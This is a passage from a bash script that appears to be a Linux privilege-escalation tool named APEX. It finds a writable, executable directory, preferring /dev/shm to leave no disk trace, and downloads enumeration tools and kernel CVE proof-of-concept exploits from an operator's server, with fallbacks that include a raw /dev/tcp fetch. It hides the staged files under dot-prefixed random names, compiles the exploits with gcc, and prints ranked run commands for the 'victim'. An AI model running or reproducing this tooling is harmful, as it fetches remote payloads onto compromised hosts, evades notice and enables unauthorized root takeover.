        cmdline=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)
        url=$(_origin_extract "$cmdline")
        if [ -n "$url" ]; then
            # Strip path component → keep scheme + host[:port] + optional dir.
            APEX_ORIGIN_BASE=$(printf '%s' "$url" | sed -E 's|(https?://[^/]+).*|\1|')
            unset -f _origin_extract 2>/dev/null
            return 0
        fi
    done

    # Sibling walk — bash <(curl URL) puts curl as our sibling.
    # Use our session ID; on Linux /proc/$$/stat field 6 is the session.
    local mysid
    mysid=$(awk '{print $6}' /proc/$$/stat 2>/dev/null)
    if [ -n "$mysid" ]; then
        local stat_file proc_pid sid
        for stat_file in /proc/[0-9]*/stat; do
            [ -r "$stat_file" ] || continue
            sid=$(awk '{print $6}' "$stat_file" 2>/dev/null)
            [ "$sid" = "$mysid" ] || continue
            proc_pid=${stat_file#/proc/}
            proc_pid=${proc_pid%/stat}
            cmdline=$(tr '\0' ' ' < "/proc/$proc_pid/cmdline" 2>/dev/null)
            url=$(_origin_extract "$cmdline")
            if [ -n "$url" ]; then
                APEX_ORIGIN_BASE=$(printf '%s' "$url" | sed -E 's|(https?://[^/]+).*|\1|')
                unset -f _origin_extract 2>/dev/null
                return 0
            fi
        done
    fi

    unset -f _origin_extract 2>/dev/null
    APEX_ORIGIN_BASE=""
    return 1
}

apex_find_exec_dir() {
    # GAP 5: preferred order is /dev/shm (RAM, no disk trace), then per-user
    # runtime dir, then /tmp / /var/tmp. We also pre-screen against `noexec`
    # mount flags so we can SKIP doomed candidates instead of writing a probe
    # file into them; the real exec probe still runs as the final check.
    local candidates="/dev/shm /run/user/$(id -u) /tmp /var/tmp $HOME"
    local noexec_mounts=""
    if [ -r /proc/mounts ]; then
        # mount fields: src target fstype opts dump pass
        noexec_mounts=$(awk '$4 ~ /(^|,)noexec(,|$)/ {print $2}' /proc/mounts 2>/dev/null)
    fi
    local d
    for d in $candidates; do
        [ -d "$d" ] && [ -w "$d" ] || continue
        # Skip if directory sits under a noexec mount.
        if [ -n "$noexec_mounts" ]; then
            local _m _skip=0
            for _m in $noexec_mounts; do
                case "$d/" in "$_m/"*) _skip=1; break ;; esac
            done
            [ "$_skip" = "1" ] && continue
        fi
        local testfile="$d/.apex_xt_$$"
        printf '#!/bin/sh\nexit 0\n' > "$testfile" 2>/dev/null || continue
        chmod +x "$testfile" 2>/dev/null
        if "$testfile" 2>/dev/null; then
            rm -f "$testfile"
            APEX_EXEC_DIR="$d"
            return 0
        fi
        rm -f "$testfile"
    done
    APEX_EXEC_DIR=""
    return 1
}

apex_download_tool() {
    local filename="$1" outpath="$2"
    [ -n "$APEX_ORIGIN_BASE" ] || return 1
    local url="${APEX_ORIGIN_BASE}/${filename}"
    local ok=0
    if command -v curl >/dev/null 2>&1; then
        safe_run 30 curl -fsk "$url" -o "$outpath" 2>/dev/null && ok=1
    fi
    if [ "$ok" -eq 0 ] && command -v wget >/dev/null 2>&1; then
        safe_run 30 wget -q "$url" -O "$outpath" 2>/dev/null && ok=1
    fi
    if [ "$ok" -eq 0 ] && command -v python3 >/dev/null 2>&1; then
        safe_run 30 python3 -c "
import urllib.request,sys
try: urllib.request.urlretrieve('$url','$outpath'); sys.exit(0)
except: sys.exit(1)
" 2>/dev/null && ok=1
    fi
    # python2 fallback
    if [ "$ok" -eq 0 ] && command -v python2 >/dev/null 2>&1; then
        safe_run 30 python2 -c "
import urllib,sys
try: urllib.urlretrieve('$url','$outpath'); sys.exit(0)
except: sys.exit(1)
" 2>/dev/null && ok=1
    fi
    # perl fallback (LWP often available)
    if [ "$ok" -eq 0 ] && command -v perl >/dev/null 2>&1; then
        safe_run 30 perl -e "
use LWP::Simple;
getstore('$url','$outpath') == 200 ? exit(0) : exit(1);
" 2>/dev/null && ok=1
    fi
    # php fallback
    if [ "$ok" -eq 0 ] && command -v php >/dev/null 2>&1; then
        safe_run 30 php -r "
file_put_contents('$outpath', file_get_contents('$url')) ? exit(0) : exit(1);
" 2>/dev/null && ok=1
    fi
    # ruby fallback
    if [ "$ok" -eq 0 ] && command -v ruby >/dev/null 2>&1; then
        safe_run 30 ruby -e "
require 'open-uri'; File.open('$outpath','wb'){|f|f.write(URI.open('$url').read)} rescue exit(1); exit(0)
" 2>/dev/null && ok=1
    fi
    # busybox wget fallback (alpine + many embedded)
    if [ "$ok" -eq 0 ] && command -v busybox >/dev/null 2>&1; then
        safe_run 30 busybox wget -q "$url" -O "$outpath" 2>/dev/null && ok=1
    fi
    # Pure-bash /dev/tcp HTTP/1.1 GET — last-ditch when NO downloader exists.
    # Only HTTP (not HTTPS); APEX_ORIGIN is always plain HTTP from apex_serve.
    if [ "$ok" -eq 0 ] && [ -e /dev/tcp ] 2>/dev/null || [ -n "${BASH_VERSION:-}" ]; then
        _apex_devtcp_fetch "$url" "$outpath" && ok=1
    fi
    if [ "$ok" -eq 1 ]; then
        local sz
        sz=$(wc -c < "$outpath" 2>/dev/null)
        [ "${sz:-0}" -gt 10240 ] || { rm -f "$outpath"; return 1; }
        return 0
    fi
    return 1
}

# ─── _apex_devtcp_fetch ─────────────────────────────────────────────────────
# Pure-bash HTTP/1.1 GET via /dev/tcp. Works when curl/wget/python/perl/ruby/
# php/busybox are ALL missing — e.g. minimal alpine, busybox-stripped CTF
# boxes, or hardened distros that block downloaders. HTTP only (no TLS).
# Strips response headers, writes body to outpath. Returns 0 on success.
_apex_devtcp_fetch() {
    local url="$1" out="$2"
    local host port path scheme
    case "$url" in
        http://*) scheme=http; url="${url#http://}" ;;
        https://*) return 1 ;;
        *) return 1 ;;
    esac
    path="/${url#*/}"
    [ "$path" = "/$url" ] && path="/"
    host="${url%%/*}"
    case "$host" in
        *:*) port="${host##*:}"; host="${host%%:*}" ;;
        *)   port=80 ;;
    esac
    [ -n "${BASH_VERSION:-}" ] || return 1
    exec 7<>/dev/tcp/"$host"/"$port" 2>/dev/null || return 1
    printf 'GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: apex/1\r\nConnection: close\r\n\r\n' \
        "$path" "$host" >&7
    : > "$out" 2>/dev/null || { exec 7<&-; return 1; }
    local in_body=0 line
    while IFS= read -r line <&7; do
        line="${line%$'\r'}"
        if [ "$in_body" = "0" ]; then
            [ -z "$line" ] && in_body=1
            continue
        fi
        printf '%s\n' "$line" >> "$out"
    done
    exec 7<&-
    [ -s "$out" ]
}

apex_select_pspy_arch() {
    local arch
    arch=$(uname -m 2>/dev/null)
    case "$arch" in
        x86_64|amd64)             printf 'pspy64s' ;;
        i*86|i686)                printf 'pspy32s' ;;
        aarch64|arm64)            printf 'pspy64arm' ;;
        armv*l|arm|armhf|armv7*) printf 'pspy32arm' ;;
        *)
            local elf_bits
            elf_bits=$(file /bin/ls 2>/dev/null | grep -oE '(32|64)-bit' | grep -oE '[0-9]+')
            [ "${elf_bits:-64}" = "32" ] && printf 'pspy32s' || printf 'pspy64s'
            ;;
    esac
}

# ─── apex_fetch_manifest ─────────────────────────────────────────────────────
# Probes the origin server for a manifest.txt describing what tools / CVE port
# are available. Populates:
#   APEX_MANIFEST_TOOLS  — space-separated tool filenames
#   APEX_CVE_BASE        — full URL to CVE root (e.g. http://IP:PORT/cve)
# Falls back to sane defaults when manifest isn't present (older apex_serve).
APEX_MANIFEST_TOOLS=""
APEX_CVE_BASE="${APEX_CVE_BASE:-}"
apex_fetch_manifest() {
    [ -n "$APEX_ORIGIN_BASE" ] || return 1
    local mf
    mf=$(safe_run 10 curl -fsk --max-time 8 "${APEX_ORIGIN_BASE}/manifest.txt" 2>/dev/null) || \
        mf=$(safe_run 10 wget -q --timeout=8 -O- "${APEX_ORIGIN_BASE}/manifest.txt" 2>/dev/null) || \
        mf=""
    [ -z "$mf" ] && return 1
    local line k v
    while IFS= read -r line; do
        case "$line" in
            arsenal_base=*) ;;
            cve_base=*)
                [ -z "$APEX_CVE_BASE" ] && APEX_CVE_BASE="${line#cve_base=}"
                ;;
            tools:*)
                APEX_MANIFEST_TOOLS="${line#tools:}"
                APEX_MANIFEST_TOOLS="${APEX_MANIFEST_TOOLS# }"
                ;;
        esac
    done <<EOF
$mf
EOF
    return 0
}

# ─── apex_stage_arsenal ──────────────────────────────────────────────────────
# Pull every available enumerator into APEX_EXEC_DIR, chmod +x, do a smoke
# test, and print a SAVED block listing every staged path. Returns the list
# in APEX_STAGED_TOOLS (newline-separated  "name=path").
APEX_STAGED_TOOLS=""
apex_stage_arsenal() {
    [ -n "$APEX_ORIGIN_BASE" ] || return 1
    [ -n "$APEX_EXEC_DIR" ] || apex_find_exec_dir
    [ -n "$APEX_EXEC_DIR" ] || return 1
    apex_fetch_manifest

    # Default list when manifest is absent (older apex_serve / direct GH URLs).
    local tools="$APEX_MANIFEST_TOOLS"
    if [ -z "$tools" ]; then
        local _arch_pspy
        _arch_pspy=$(apex_select_pspy_arch)
        tools="apex.sh $_arch_pspy linpeas.sh lse.sh linenum.sh les.sh"
    fi

    APEX_STAGED_TOOLS=""
    local t dest sz exec_ok
    printf '\n%s-- APEX arsenal staging ------------------------------------------------%s\n' \
        "${_c_cyan:-}" "${_c_reset:-}" >&2
    for t in $tools; do
        # apex.sh is the script we're already running — skip self-fetch.
        case "$t" in apex.sh|manifest.txt|""|tools:*) continue ;; esac

        # Land in EXEC_DIR with a randomized prefix so co-tenant scans don't
        # spot us trivially. dot-prefix hides from default ls.
        dest="$APEX_EXEC_DIR/.apex_${t}_${$}_${RANDOM:-0}"
        # NOT registered as tempfile — staged tools persist for operator use.
        # Operator must clean up manually. Path printed in SAVED block below.

        if apex_download_tool "$t" "$dest"; then
            chmod +x "$dest" 2>/dev/null
            sz=$(wc -c < "$dest" 2>/dev/null)
            # Smoke test: ELF gets a magic-byte check; shell scripts get
            # bash -n; perl scripts get perl -c. We don't actually RUN the
            # tool here — only verify it's loadable. The real run happens
            # in layer_6 / tool_orchestrator.
            exec_ok=0
            local magic
            # `od -An -c -N4` prints "177   E   L   F" for ELF magic
            # (three spaces between each token). Use grep instead of case
            # for a portable pattern that doesn't depend on whitespace.
            magic=$(od -An -c -N4 -- "$dest" 2>/dev/null)
            if printf '%s' "$magic" | grep -q '177.*E.*L.*F'; then
                exec_ok=1
            else
                case "$t" in
                    *.pl)
                        command -v perl >/dev/null 2>&1 && \
                            perl -c "$dest" 2>/dev/null && exec_ok=1
                        # If perl not present, accept any non-empty download.
                        [ "$exec_ok" = "0" ] && [ "${sz:-0}" -gt 1024 ] && exec_ok=1
                        ;;
                    *.py)
                        command -v python3 >/dev/null 2>&1 && \
                            python3 -m py_compile "$dest" 2>/dev/null && exec_ok=1
                        [ "$exec_ok" = "0" ] && [ "${sz:-0}" -gt 1024 ] && exec_ok=1
                        ;;
                    *)
                        bash -n "$dest" 2>/dev/null && exec_ok=1
                        ;;
                esac
            fi
            if [ "$exec_ok" = "1" ]; then
                printf '%s| %sSAVED%s %-14s → %s  (%s B)\n' \
                    "${_c_cyan:-}" "${_c_green:-}" "${_c_reset:-}" "$t" "$dest" "$sz" >&2
                APEX_STAGED_TOOLS="${APEX_STAGED_TOOLS}${t}=${dest}
"
                # Register as a non-confidence finding so the output layer
                # mentions it in the summary instead of dropping it silently.
                register_finding "TOOL_STAGED" "$dest" \
                    "Arsenal tool ${t} staged at ${dest} (${sz} bytes)" \
                    0 "tool_stage"
            else
                printf '%s| %sFAIL %s %-14s — corrupt / non-exec (%s B)\n' \
                    "${_c_cyan:-}" "${_c_red:-}" "${_c_reset:-}" "$t" "$sz" >&2
                rm -f "$dest"
            fi
        else
            printf '%s| %sMISS %s %-14s — origin has no copy\n' \
                "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$t" >&2
        fi
    done
    printf '%s------------------------------------------------------------------------%s\n\n' \
        "${_c_cyan:-}" "${_c_reset:-}" >&2

    [ -n "$APEX_STAGED_TOOLS" ] && return 0
    return 1
}

# ─── apex_stage_cve ──────────────────────────────────────────────────────────
# Pull matching CVE PoCs into APEX_EXEC_DIR. Reads INDEX.json from CVE_BASE,
# selects entries whose declared kernel range / distro tags match THIS host's
# pre-flight data, downloads them, and (for .c files) attempts to compile
# with gcc if available. Prints a SAVED block listing every staged PoC and
# its compiled binary if present.
APEX_STAGED_CVES=""
apex_stage_cve() {
    [ -n "$APEX_CVE_BASE" ] || return 1
    [ -n "$APEX_EXEC_DIR" ] || apex_find_exec_dir
    [ -n "$APEX_EXEC_DIR" ] || return 1

    local idx
    idx=$(safe_run 10 curl -fsk --max-time 8 "${APEX_CVE_BASE}/INDEX.json" 2>/dev/null) || \
        idx=$(safe_run 10 wget -q --timeout=8 -O- "${APEX_CVE_BASE}/INDEX.json" 2>/dev/null) || \
        idx=""
    [ -z "$idx" ] && return 1

    # Parse INDEX.json with a tolerant python helper so we get note+success+run
    # together (the multi-field per-entry walk is awkward in pure shell).
    # Output is one record per line:  file<TAB>success<TAB>run<TAB>note
    local parsed
    parsed=$(printf '%s' "$idx" | python3 -c '
import sys,json,re
data=sys.stdin.read()
try:
    j=json.loads(data)
    # Handle both {"entries":[...]} and bare [...] formats
    entries=j.get("entries",[]) if isinstance(j,dict) else (j if isinstance(j,list) else [])
    for e in entries:
        try:
            f=str(e.get("file",""))
            s=str(e.get("success",0))
            r=str(e.get("run",""))
            n=str(e.get("note",""))
            if not f or not f.startswith("CVE-"): continue
            r=re.sub(r"[\t\n\r]"," ",r)
            n=re.sub(r"[\t\n\r]"," ",n)
            sys.stdout.write(f+"\t"+s+"\t"+r+"\t"+n+"\n")
        except Exception:
            pass
except Exception:
    pass
' 2>/dev/null)

    # Python missing or INDEX malformed → improved sed/grep fallback that
    # also extracts success% and run fields (not just filenames).
    if [ -z "$parsed" ]; then
        parsed=$(printf '%s' "$idx" | tr '\n' ' ' | sed 's/},{/}\n{/g' \
            | while IFS= read -r _chunk; do
                _f=$(printf '%s' "$_chunk" | grep -oE '"file":"CVE-[^"]+"' \
                     | sed 's/"file":"//;s/"$//' | head -1)
                [ -z "$_f" ] && continue
                _s=$(printf '%s' "$_chunk" | grep -oE '"success":[0-9]+' \
                     | grep -oE '[0-9]+' | head -1)
                _r=$(printf '%s' "$_chunk" | grep -oE '"run":"[^"]*"' \
                     | sed 's/"run":"//;s/"$//' | head -1)
                printf '%s\t%s\t%s\t\n' "$_f" "${_s:-0}" "${_r:-}"
            done)
    fi
    [ -z "$parsed" ] && return 1

    APEX_STAGED_CVES=""
    local f success run_cmd note dest sz
    printf '\n%s-- APEX CVE PoC staging (high-success-rate only) -------------------------%s\n' \
        "${_c_cyan:-}" "${_c_reset:-}" >&2
    # Use FD 4 so the inner download can still touch stdin if needed.
    exec 4<<EOF
$parsed
EOF
    while IFS=$'\t' read -r f success run_cmd note <&4; do
        [ -z "$f" ] && continue
        case "$f" in CVE-*) ;; *) continue ;; esac
        dest="$APEX_EXEC_DIR/.apex_cve_${f}_${$}"
        # NOT registered as tempfile — CVE PoC files persist for operator use after APEX exits.
        local url="${APEX_CVE_BASE}/${f}"
        local ok=0
        if command -v curl >/dev/null 2>&1; then
            safe_run 20 curl -fsk --max-time 15 -o "$dest" "$url" 2>/dev/null && ok=1
        fi
        if [ "$ok" = "0" ] && command -v wget >/dev/null 2>&1; then
            safe_run 20 wget -q --timeout=15 -O "$dest" "$url" 2>/dev/null && ok=1
        fi
        if [ "$ok" = "0" ]; then
            printf '%s| %sMISS%s %s — download failed (404 or no server)\n' \
                "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" >&2
            rm -f "$dest" 2>/dev/null
            continue
        fi
        # Guard: some curl/wget versions create a 0-byte file even on error.
        if [ ! -f "$dest" ]; then
            printf '%s| %sMISS%s %s — no file after download\n' \
                "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" >&2
            continue
        fi
        { sz=$(wc -c < "$dest"); } 2>/dev/null
        if [ "${sz:-0}" -lt 200 ]; then
            printf '%s| %sMISS%s %s — response too small (%s B), likely 404\n' \
                "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" "${sz:-0}" >&2
            rm -f "$dest" 2>/dev/null
            continue
        fi
        chmod 644 "$dest" 2>/dev/null

        # Substitute __FILE__ placeholder in the run command with the actual
        # staged path. We do it server-side at fetch time so the operator can
        # copy/paste the printed command on the victim without edits.
        local concrete_run
        concrete_run=$(printf '%s' "$run_cmd" | sed "s|__FILE__|${dest}|g")

        # If the run command is a gcc-compile line, try executing the compile
        # step now (the leading "gcc … && /tmp/foo" pattern). We split on '&&'
        # and run only the gcc fragment. On success the prebuilt binary is
        # ready for the operator to invoke; the run command we PRINT still
        # contains the full compile+invoke chain so it's reproducible.
        local bin=""
        case "$concrete_run" in
            gcc\ *)
                # C source — try gcc first, then cc, then tcc (tiny C compiler)
                local _cc=""
                command -v gcc >/dev/null 2>&1 && _cc="gcc"
                [ -z "$_cc" ] && command -v cc  >/dev/null 2>&1 && _cc="cc"
                [ -z "$_cc" ] && command -v tcc >/dev/null 2>&1 && _cc="tcc"
                if [ -n "$_cc" ]; then
                    local compile_cmd
                    compile_cmd=${concrete_run%%&&*}
                    compile_cmd=${compile_cmd% }
                    # Replace 'gcc' with detected compiler
                    compile_cmd="$_cc ${compile_cmd#gcc }"
                    # Extract the -o target so we can confirm it exists post-build.
                    local out_path
                    out_path=$(printf '%s' "$compile_cmd" | sed -nE 's/.* -o ([^ ]+).*/\1/p')
                    safe_run 30 sh -c "$compile_cmd" 2>/dev/null
                    if [ -n "$out_path" ] && [ -f "$out_path" ]; then
                        chmod +x "$out_path" 2>/dev/null
                        bin="$out_path"
                    fi
                else
                    # No C compiler — try musl-cross / zig cc as last resort
                    printf '%s| %sNO-CC%s %s — no C compiler found. Try: apt install gcc / musl-tools%s\n' \
                        "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" "${_c_reset:-}" >&2
                fi
                ;;
            python3\ *)
                # Python3 PoC — fallback chain: python3 → python2 → python → suggest C variant
                if command -v python3 >/dev/null 2>&1; then
                    chmod +x "$dest" 2>/dev/null
                elif command -v python2 >/dev/null 2>&1; then
                    concrete_run=$(printf '%s' "$concrete_run" | sed 's/^python3/python2/')
                    chmod +x "$dest" 2>/dev/null
                    printf '%s| %sFALL%s  %s → using python2 (no python3)\n' \
                        "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" >&2
                elif command -v python >/dev/null 2>&1; then
                    concrete_run=$(printf '%s' "$concrete_run" | sed 's/^python3/python/')
                    chmod +x "$dest" 2>/dev/null
                    printf '%s| %sFALL%s  %s → using python (no python3)\n' \
                        "${_c_cyan:-}" "${_c_yellow:-}" "${_c_reset:-}" "$f" >&2
                else
                    # No Python at all — look for a C variant in the same CVE family
                    local _cve_base="${f%%.py}"
                    printf '%s| %sNO-PY%s %s — no Python found. Look for C variant: %s.c\n' \
                        "${_c_cyan:-}" "${_c_red:-}" "${_c_reset:-}" "$f" "$_cve_base" >&2
                    printf '%s|       Bash alternative: wget/curl the .c variant and gcc-compile\n' \
                        "${_c_cyan:-}" >&2
                    rm -f "$dest"
                    continue
                fi
                ;;
            perl\ *)
                command -v perl >/dev/null 2>&1 || {
                    printf '%s| %sNO-PL%s %s — no perl found\n' \
                        "${_c_cyan:-}" "${_c_red:-}" "${_c_reset:-}" "$f" >&2
                    rm -f "$dest"; continue
                }
                chmod +x "$dest" 2>/dev/null
                ;;
            sh\ *|bash\ *)
                chmod +x "$dest" 2>/dev/null
                ;;
        esac

        # Truncate note for the box-line display but keep full text for finding.
        local short_note
        short_note=$(printf '%s' "$note" | cut -c1-55)
        # Hard-cap the confidence recorded in findings at 65. CVE PoCs are
        # generic kernel-version-dependent deliverables, not host-specific
        # vectors — they must NEVER outrank a FOREIGN_FILE_IN_WRITABLE_DIR or
        # CUSTOM_BIN_PATH_HIJACK in the operator's ranked path list. The raw
        # `success` percentage is still shown next to the run command so the
        # operator can pick the most reliable PoC; only the chain-confidence
        # used by build_confirmed_chains() / TOP-10 is capped.
        local conf_capped=65
        if [ -n "$bin" ]; then
            printf '%s| %sSAVED%s %-32s [success=%s%%] bin=%s\n' \
                "${_c_cyan:-}" "${_c_green:-}" "${_c_reset:-}" "$f" "$success" "$bin" >&2
            printf '%s|       run: %s%s\n' "${_c_cyan:-}" "$concrete_run" "${_c_reset:-}" >&2
            APEX_STAGED_CVES="${APEX_STAGED_CVES}${f}=${bin}|${success}|${concrete_run}
"
            register_finding "CVE_POC_STAGED" "$bin" \
                "CVE PoC compiled: ${f} → ${bin} (success ${success}%, ${note})" \
                "$conf_capped" "cve_stage"
            register_exploit "CVE_POC_STAGED" "$bin" "$concrete_run"
        else
            printf '%s| %sSAVED%s %-32s [success=%s%%] src=%s\n' \
                "${_c_cyan:-}" "${_c_green:-}" "${_c_reset:-}" "$f" "$success" "$dest" >&2
            printf '%s|       run: %s%s\n' "${_c_cyan:-}" "$concrete_run" "${_c_reset:-}" >&2
            APEX_STAGED_CVES="${APEX_STAGED_CVES}${f}=${dest}|${success}|${concrete_run}
"
            register_finding "CVE_POC_STAGED" "$dest" \
                "CVE PoC source: ${f} at ${dest} (success ${success}%, ${note})" \
                "$conf_capped" "cve_stage"
            register_exploit "CVE_POC_STAGED" "$dest" "$concrete_run"
        fi
    done
    exec 4<&-
    printf '%s------------------------------------------------------------------------%s\n' \
        "${_c_cyan:-}" "${_c_reset:-}" >&2

    # Operator-facing run summary — sorted by success descending so the most
    # reliable exploit is the first one the operator sees.
    if [ -n "$APEX_STAGED_CVES" ]; then
        printf '\n%s-- CVE run instructions (try in this order) ------------------------------%s\n' \
            "${_c_cyan:-}" "${_c_reset:-}" >&2
        local _cve_sorted
        _cve_sorted=$(printf '%s\n' "$APEX_STAGED_CVES" | grep -v '^$' \
            | awk -F'|' '{print $2"\t"$0}' | sort -rn 2>/dev/null | cut -f2-)
        printf '%s\n' "$_cve_sorted" | while IFS='|' read -r namepath success cmd; do
            local nm=${namepath%%=*}
            printf '%s| %s[%s%%] %s%s\n' "${_c_cyan:-}" "${_c_green:-}" "$success" "$nm" "${_c_reset:-}" >&2
            printf '%s|        %s%s\n' "${_c_cyan:-}" "$cmd" "${_c_reset:-}" >&2
        done
        printf '%s------------------------------------------------------------------------%s\n\n' \
            "${_c_cyan:-}" "${_c_reset:-}" >&2
        return 0
    fi
    return 1
}

# ─── cleanup_apex ───────────────────────────────────────────────────────────
# Idempotent. Safe to call multiple times — APEX_TMP is nulled after removal
# and the registered-tempfile list is cleared. Refuses to rm -rf an unexpected
# path (defense against APEX_TMP being externally overwritten with /).
cleanup_apex() {
    # Kill our background jobs, if any
    local job_pid
    for job_pid in $(jobs -p 2>/dev/null); do
        kill "$job_pid" 2>/dev/null
    done
    wait 2>/dev/null

    # Sweep externally-registered tempfiles
    if [ -n "$APEX_TEMPFILES" ]; then
        local f
        while IFS= read -r f; do
            [ -n "$f" ] && rm -f -- "$f" 2>/dev/null
        done <<EOF
$APEX_TEMPFILES
EOF
        APEX_TEMPFILES=""
    fi

    # Remove APEX_TMP if it looks like one of ours
    if [ -n "$APEX_TMP" ] && [ -d "$APEX_TMP" ]; then
        case "$APEX_TMP" in
            /dev/shm/.apex_*|/tmp/.apex_*|/var/tmp/.apex_*)
                rm -rf -- "$APEX_TMP" 2>/dev/null
                ;;
            "${HOME}"/.apex_*)
                rm -rf -- "$APEX_TMP" 2>/dev/null
                ;;
            *)
                : # Refuse to rm -rf an unexpected path
                ;;
        esac
        APEX_TMP=""
        APEX_FINDINGS_DIR=""
        APEX_LOG=""
    fi
    return 0
}

log_debug()               { return 0; }   # only emits when APEX_DEBUG=1
log_info()                { return 0; }   # informational, gated by verbose
log_warn()                { return 0; }   # always shown (to stderr)
log_error()               { return 0; }   # always shown (to stderr)


# =============================================================================
# SECTION 4 — Pre-Flight Detection
# =============================================================================
# Pre-flight determines HOW the tool runs. Every later function reads the
# globals set here. No detection logic runs after Phase 2 completes.

# ─── detect_bash_features ───────────────────────────────────────────────────
# Sets HAS_BASH=1 when running under bash (BASH_VERSION set by the bash itself
# even for /bin/sh symlinks pointing to bash), HAS_ASSOCIATIVE_ARRAYS=1 when
# BASH_VERSINFO[0] >= 4 (declare -A works). Must run before any function uses
# bash-specific syntax behind a HAS_BASH guard.
detect_bash_features() {
    if [ -n "${BASH_VERSION:-}" ]; then
        HAS_BASH=1
        local major="${BASH_VERSINFO[0]:-0}"
        if [ "$major" -ge 4 ]; then
            HAS_ASSOCIATIVE_ARRAYS=1
        fi
    else
        HAS_BASH=0
        HAS_ASSOCIATIVE_ARRAYS=0
    fi
    apex_detect_shell
    return 0
}

# ─── detect_environment ─────────────────────────────────────────────────────
# Populates: APEX_USER APEX_UID APEX_HOSTNAME APEX_PWD
#            OS_ID OS_VERSION KERNEL ARCH INIT PKG
#            HAS_GETCAP HAS_STRINGS HAS_LDD HAS_DEBSUMS HAS_RPMV HAS_BUSCTL
#            HAS_PYTHON3 HAS_PYTHON2 HAS_PERL HAS_STRACE HAS_LSATTR HAS_READELF
#            HAS_EXPECT HAS_INOTIFYWAIT HAS_RUBY HAS_NODE HAS_LUA HAS_GCC HAS_CC
#            TIMEOUT_CMD NET_TOOL FIND_HAS_WRITABLE STAT_GNU
detect_environment() {
    APEX_USER=$(id -un 2>/dev/null)
    APEX_UID=$(id -u 2>/dev/null)
    APEX_HOSTNAME=$(uname -n 2>/dev/null)
    APEX_PWD=$(pwd 2>/dev/null)
    KERNEL=$(uname -r 2>/dev/null)
    ARCH=$(uname -m 2>/dev/null)
    [ -z "$APEX_UID" ] && APEX_UID=0

    # OS via /etc/os-release (read directly — virtual files don't hang)
    if [ -r /etc/os-release ]; then
        OS_ID=$(awk -F= '/^ID=/{gsub(/"/,"",$2); print $2; exit}' /etc/os-release 2>/dev/null)
        OS_VERSION=$(awk -F= '/^VERSION_ID=/{gsub(/"/,"",$2); print $2; exit}' /etc/os-release 2>/dev/null)
    fi
    [ -z "$OS_ID" ]      && OS_ID="unknown"
    [ -z "$OS_VERSION" ] && OS_VERSION="unknown"

    # Init system — order matters (systemd check first; many systems have
    # systemctl symlinks even on non-systemd).
    if [ -d /run/systemd/system ]; then
        INIT="systemd"
    elif command -v rc-service >/dev/null 2>&1; then
        INIT="openrc"
    elif [ -d /etc/runit ] || command -v sv >/dev/null 2>&1; then
        INIT="runit"
    elif [ -f /etc/init.d/rc ] || [ -d /etc/rc.d ]; then
        INIT="sysvinit"
    else
        INIT="unknown"
    fi

    # Package manager (first match wins — dpkg before rpm because Kali has both)
    if   command -v dpkg   >/dev/null 2>&1; then PKG="dpkg"
    elif command -v rpm    >/dev/null 2>&1; then PKG="rpm"
    elif command -v apk    >/dev/null 2>&1; then PKG="apk"
    elif command -v pacman >/dev/null 2>&1; then PKG="pacman"
    elif command -v zypper >/dev/null 2>&1; then PKG="zypper"
    else                                          PKG="none"
    fi

    # Available binaries
    command -v getcap      >/dev/null 2>&1 && HAS_GETCAP=1
    command -v strings     >/dev/null 2>&1 && HAS_STRINGS=1
    command -v ldd         >/dev/null 2>&1 && HAS_LDD=1
    command -v debsums     >/dev/null 2>&1 && HAS_DEBSUMS=1
    [ "$PKG" = "rpm" ]                     && HAS_RPMV=1
    command -v busctl      >/dev/null 2>&1 && HAS_BUSCTL=1
    command -v python3     >/dev/null 2>&1 && HAS_PYTHON3=1
    command -v python2     >/dev/null 2>&1 && HAS_PYTHON2=1
    command -v perl        >/dev/null 2>&1 && HAS_PERL=1
    command -v strace      >/dev/null 2>&1 && HAS_STRACE=1
    command -v lsattr      >/dev/null 2>&1 && HAS_LSATTR=1
    command -v readelf     >/dev/null 2>&1 && HAS_READELF=1
    command -v expect      >/dev/null 2>&1 && HAS_EXPECT=1
    command -v inotifywait >/dev/null 2>&1 && HAS_INOTIFYWAIT=1
    command -v ruby        >/dev/null 2>&1 && HAS_RUBY=1
    command -v node        >/dev/null 2>&1 && HAS_NODE=1
    command -v lua         >/dev/null 2>&1 && HAS_LUA=1
    command -v gcc         >/dev/null 2>&1 && HAS_GCC=1
    command -v cc          >/dev/null 2>&1 && HAS_CC=1

    # Timeout (re-detected here in case detect_environment is the first to run)
    if [ "$TIMEOUT_CMD" = "none" ]; then
        if command -v timeout >/dev/null 2>&1; then
            TIMEOUT_CMD="timeout"
        elif command -v busybox >/dev/null 2>&1 && busybox timeout 1 true >/dev/null 2>&1; then
            TIMEOUT_CMD="busybox-timeout-modern"
        elif command -v busybox >/dev/null 2>&1 && busybox timeout -t 1 true >/dev/null 2>&1; then
            TIMEOUT_CMD="busybox-timeout"
        fi
    fi

    # Network tool preference (ss > netstat > /proc/net/tcp)
    if   command -v ss      >/dev/null 2>&1; then NET_TOOL="ss"
    elif command -v netstat >/dev/null 2>&1; then NET_TOOL="netstat"
    else                                           NET_TOOL="proc"
    fi

    # find -writable support (GNU has it, BusyBox/BSD do not)
    if find / -maxdepth 0 -writable >/dev/null 2>&1; then
        FIND_HAS_WRITABLE=1
    fi

    # GNU stat (-c) vs BSD stat (-f)
    if stat -c '%U' /etc/passwd >/dev/null 2>&1; then
        STAT_GNU=1
    fi

    return 0
}

# ─── detect_security_layers ─────────────────────────────────────────────────
# Populates SELINUX_STATUS, APPARMOR_STATUS, SECCOMP_STATUS.
# All reads target small virtual files or short-output commands — wrapped in
# safe_run() where shelling out, direct reads for /sys and /proc/self/status.
detect_security_layers() {
    # ── SELinux ─────────────────────────────────────────────────────────────
    if command -v getenforce >/dev/null 2>&1; then
        SELINUX_STATUS=$(safe_run 2 getenforce)
        [ -z "$SELINUX_STATUS" ] && SELINUX_STATUS="Unknown"
    elif [ -r /sys/fs/selinux/enforce ]; then
        local enf
        enf=$(cat /sys/fs/selinux/enforce 2>/dev/null)
        case "$enf" in
            1) SELINUX_STATUS="Enforcing"  ;;
